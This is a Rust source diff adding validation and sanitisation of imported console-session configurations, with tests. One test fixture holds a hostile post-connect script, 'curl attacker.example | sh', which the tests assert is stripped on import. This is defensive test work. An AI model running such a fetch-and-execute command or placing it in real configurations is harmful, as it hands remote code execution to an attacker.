@@ -1,6 +1,9 @@
 use std::collections::{HashMap, HashSet};
 
-use crate::domain::session::{QuickConnectTarget, SessionError, SessionFolder, SessionRecord};
+use crate::domain::{
+    console::{parse_console_config, serialize_console_config},
+    session::{QuickConnectTarget, SessionError, SessionFolder, SessionRecord},
+};
 
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize, uniffi::Record)]
 pub struct ImportSessionPreview {
@@ -174,21 +177,29 @@ pub fn preview_stacio_json_import(
     let existing = existing_set(existing_session_names);
     let folders_by_id = folder_paths_by_id(&bundle.folders);
     let mut ignored_advanced_configuration = false;
+    let mut sanitized_or_rejected_console_configuration = false;
     let sessions = bundle
         .sessions
         .into_iter()
         .filter_map(|session| {
-            let (preview, ignored_configuration) =
-                stacio_json_preview_session(session, &folders_by_id, &existing);
-            ignored_advanced_configuration |= ignored_configuration;
+            let (preview, notice) = stacio_json_preview_session(session, &folders_by_id, &existing);
+            match notice {
+                ImportConfigurationNotice::None => {}
+                ImportConfigurationNotice::Advanced => ignored_advanced_configuration = true,
+                ImportConfigurationNotice::Console => {
+                    sanitized_or_rejected_console_configuration = true
+                }
+            }
             preview
         })
         .collect::<Vec<_>>();
-    let warnings = if ignored_advanced_configuration {
-        vec!["为安全起见，导入文件中的高级和自动执行配置已忽略，仅保留会话图标；请在导入后检查会话设置。".to_string()]
-    } else {
-        Vec::new()
-    };
+    let mut warnings = Vec::new();
+    if ignored_advanced_configuration {
+        warnings.push("为安全起见，导入文件中的高级和自动执行配置已忽略，仅保留会话图标；请在导入后检查会话设置。".to_string());
+    }
+    if sanitized_or_rejected_console_configuration {
+        warnings.push("Console 配置已按安全合同规范化，无法验证的 Console 会话已跳过；请在导入后检查设备绑定。".to_string());
+    }
 
     Ok(preview_from_parts(sessions, warnings, 0))
 }
@@ -211,23 +222,71 @@ fn stacio_json_preview_session(
     exported: StacioSessionExportRecord,
     folders_by_id: &HashMap<String, String>,
     existing: &HashSet<String>,
-) -> (Option<ImportSessionPreview>, bool) {
-    let (config_json, ignored_configuration) = sanitized_import_config_json(exported.config_json);
+) -> (Option<ImportSessionPreview>, ImportConfigurationNotice) {
     let session = exported.session;
     let protocol = session.protocol.trim().to_ascii_lowercase();
+    let (config_json, notice) = if protocol == "console" {
+        let (config_json, changed_or_rejected) =
+            validated_console_import_config_json(exported.config_json);
+        (
+            config_json,
+            if changed_or_rejected {
+                ImportConfigurationNotice::Console
+            } else {
+                ImportConfigurationNotice::None
+            },
+        )
+    } else {
+        let (config_json, ignored_configuration) =
+            sanitized_import_config_json(exported.config_json);
+        (
+            config_json,
+            if ignored_configuration {
+                ImportConfigurationNotice::Advanced
+            } else {
+                ImportConfigurationNotice::None
+            },
+        )
+    };
+
+    if protocol == "console" {
+        let name = session.name.trim().to_string();
+        let host = session.host.trim().to_string();
+        if session.port != 0 || name.is_empty() || host.is_empty() || config_json.is_none() {
+            return (None, ImportConfigurationNotice::Console);
+        }
+        return (
+            Some(ImportSessionPreview {
+                conflict: existing.contains(&name.to_ascii_lowercase()),
+                name,
+                folder: session
+                    .folder_id
+                    .as_ref()
+                    .and_then(|folder_id| folders_by_id.get(folder_id).cloned()),
+                protocol,
+                host,
+                port: 0,
+                username: None,
+                private_key_path: None,
+                config_json,
+            }),
+            notice,
+        );
+    }
+
     if !matches!(
         protocol.as_str(),
         "ssh" | "sftp" | "scp" | "ftp" | "telnet" | "vnc"
     ) {
-        return (None, ignored_configuration);
+        return (None, notice);
     }
     let Some(port) = u16::try_from(session.port).ok().filter(|port| *port > 0) else {
-        return (None, ignored_configuration);
+        return (None, notice);
     };
     let name = session.name.trim().to_string();
     let host = session.host.trim().to_string();
     if name.is_empty() || host.is_empty() {
-        return (None, ignored_configuration);
+        return (None, notice);
     }
     (
         Some(ImportSessionPreview {
@@ -250,8 +309,45 @@ fn stacio_json_preview_session(
                 .filter(|path| !path.is_empty()),
             config_json,
         }),
-        ignored_configuration,
+        notice,
     )
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ImportConfigurationNotice {
+    None,
+    Advanced,
+    Console,
+}
+
+fn validated_console_import_config_json(
+    exported: Option<serde_json::Value>,
+) -> (Option<String>, bool) {
+    let Some(exported) = exported else {
+        return (None, true);
+    };
+    let parsed = match exported {
+        serde_json::Value::String(value) => {
+            match serde_json::from_str::<serde_json::Value>(&value) {
+                Ok(parsed) => parsed,
+                Err(_) => return (None, true),
+            }
+        }
+        serde_json::Value::Null => return (None, true),
+        value => value,
+    };
+    let Ok(raw) = serde_json::to_string(&parsed) else {
+        return (None, true);
+    };
+    let Ok(config) = parse_console_config(raw) else {
+        return (None, true);
+    };
+    let Ok(serialized) = serialize_console_config(config) else {
+        return (None, true);
+    };
+    let canonical = serde_json::from_str::<serde_json::Value>(&serialized).ok();
+    let changed = canonical.as_ref() != Some(&parsed);
+    (Some(serialized), changed)
 }
 
 fn sanitized_import_config_json(exported: Option<serde_json::Value>) -> (Option<String>, bool) {
@@ -505,6 +601,113 @@ mod import_tests {
     use crate::domain::session::SessionError;
 
     use super::{preview_csv_import, preview_legacy_ini_import, preview_stacio_json_import};
+
+    fn console_import_json(config: serde_json::Value) -> String {
+        serde_json::json!({
+            "format": "stacio.sessions.v1",
+            "folders": [],
+            "sessions": [{
+                "id": "console_1",
+                "folder_id": null,
+                "name": "Core Switch Console",
+                "protocol": "console",
+                "host": "NBEE_BLE_1103 (BLE)",
+                "port": 0,
+                "username": "must-clear",
+                "private_key_path": "/private/must-clear",
+                "credential_id": "cred_must_clear",
+                "tags": ["network"],
+                "last_opened_at": null,
+                "config_json": config
+            }]
+        })
+        .to_string()
+    }
+
+    fn valid_console_import_config() -> serde_json::Value {
+        serde_json::json!({
+            "kind": "console",
+            "schemaVersion": 1,
+            "transportPolicy": "prefer_ble",
+            "ble": {
+                "deviceName": "NBEE_BLE_1103",
+                "profileID": "bterm-ffe1-split-v1",
+                "serviceUUID": "FFE1",
+                "txCharacteristicUUID": "FFE3",
+                "rxCharacteristicUUID": "FFE2",
+                "writeType": "without_response",
+                "platformBindings": {
+                    "macOSPeripheralUUID": "opaque-corebluetooth-id",
+                    "windowsDeviceID": "opaque-winrt-id"
+                }
+            },
+            "sppFallback": {
+                "enabledPlatforms": ["windows"],
+                "windowsPort": "COM7",
+                "baudRate": 9600,
+                "dataBits": 8,
+                "stopBits": 1,
+                "parity": "none",
+                "flowControl": "none"
+            },
+            "postConnectScript": "curl attacker.example | sh",
+            "password": "must-not-survive"
+        })
+    }
+
+    #[test]
+    fn previews_stacio_json_console_with_validated_complete_config() {
+        let json = console_import_json(valid_console_import_config());
+
+        let preview = preview_stacio_json_import(&json, vec![]).expect("preview console import");
+        let session = preview.sessions.first().expect("console preview");
+        let config_json = session.config_json.as_deref().expect("console config");
+        let config = crate::domain::console::parse_console_config(config_json.to_string())
+            .expect("validated imported config");
+        let serialized = serde_json::to_string(&preview).expect("serialize preview");
+
+        assert_eq!(preview.sessions.len(), 1);
+        assert_eq!(session.protocol, "console");
+        assert_eq!(session.port, 0);
+        assert_eq!(session.username, None);
+        assert_eq!(session.private_key_path, None);
+        assert_eq!(config.ble.profile_id, "bterm-ffe1-split-v1");
+        assert_eq!(
+            config
+                .ble
+                .platform_bindings
+                .mac_os_peripheral_uuid
+                .as_deref(),
+            Some("opaque-corebluetooth-id")
+        );
+        assert_eq!(
+            config.ble.platform_bindings.windows_device_id.as_deref(),
+            Some("opaque-winrt-id")
+        );
+        assert!(!config_json.contains("postConnectScript"));
+        assert!(!config_json.contains("password"));
+        assert!(!serialized.contains("must-clear"));
+        assert!(!serialized.contains("cred_must_clear"));
+        assert!(!serialized.contains("attacker.example"));
+        assert!(!serialized.contains("must-not-survive"));
+    }
+
+    #[test]
+    fn skips_stacio_json_console_with_unknown_schema_or_invalid_uuid() {
+        let mut unknown_schema = valid_console_import_config();
+        unknown_schema["schemaVersion"] = serde_json::json!(2);
+        let mut invalid_uuid = valid_console_import_config();
+        invalid_uuid["ble"]["serviceUUID"] = serde_json::json!("invalid-uuid");
+
+        for config in [unknown_schema, invalid_uuid] {
+            let json = console_import_json(config);
+            let preview =
+                preview_stacio_json_import(&json, vec![]).expect("preview invalid console import");
+
+            assert!(preview.sessions.is_empty());
+            assert_eq!(preview.warnings.len(), 1);
+        }
+    }
 
     #[test]
     fn previews_csv_sessions_and_ignores_secret_fields() {
